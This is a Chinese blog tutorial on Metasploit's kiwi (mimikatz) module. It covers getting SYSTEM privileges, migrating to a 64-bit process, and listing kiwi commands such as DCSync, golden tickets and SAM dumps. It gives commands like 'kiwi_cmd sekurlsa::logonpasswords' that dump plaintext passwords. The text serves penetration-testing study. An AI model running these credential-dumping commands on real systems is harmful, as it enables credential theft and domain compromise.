**目录**

[kiwi模块](#t0 "kiwi模块")

[kiwi模块的使用](#t1 "kiwi模块的使用")

[creds\_all](#t2 "creds_all")

[kiwi\_cmd](#t3 "kiwi_cmd")

* * *

kiwi模块
------

使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先[提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)到administrator用户。然后administrator用户可以直接getsystem到system权限。

**提权到system权限**

![](https://img-blog.csdnimg.cn/20200311185018584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**进程迁移**

kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。

![](https://img-blog.csdnimg.cn/20200311185256640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200311185328271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200311185358666.png)

kiwi模块的使用
---------

```
加载kiwi模块      
load kiwi      
查看kiwi模块的使用      
help kiwi
```


![](https://img-blog.csdnimg.cn/20200311185548929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

1.  creds\_all： 列举所有凭据
2.  creds\_kerberos：列举所有kerberos凭据
3.  creds\_msv：列举所有msv凭据
4.  creds\_ssp：列举所有ssp凭据
5.  creds\_tspkg：列举所有tspkg凭据
6.  creds\_wdigest：列举所有wdigest凭据
7.  dcsync： 通过DCSync检索用户帐户信息
8.  dcsync\_ntlm： 通过DCSync检索用户帐户NTLM散列、SID和RID
9.  golden\_ticket\_create：创建黄金票据
10.  kerberos\_ticket\_list：列举kerberos票据
11.  kerberos\_ticket\_purge：清除kerberos票据
12.  kerberos\_ticket\_use：使用kerberos票据
13.  kiwi\_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
14.  lsa\_dump\_sam：dump出lsa的SAM
15.  lsa\_dump\_secrets：dump出lsa的密文
16.  password\_change：修改密码
17.  wifi\_list： 列出当前用户的wifi配置文件
18.  wifi\_list\_shared： 列出共享wifi配置文件/编码

### creds\_all

该命令可以列举系统中的明文密码

![](https://img-blog.csdnimg.cn/20200311194411563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### kiwi\_cmd

kiwi\_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令

```
kiwi_cmd sekurlsa::logonpasswords
```


![](https://img-blog.csdnimg.cn/2020031119452789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

其他模块的用法后续慢慢更新。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)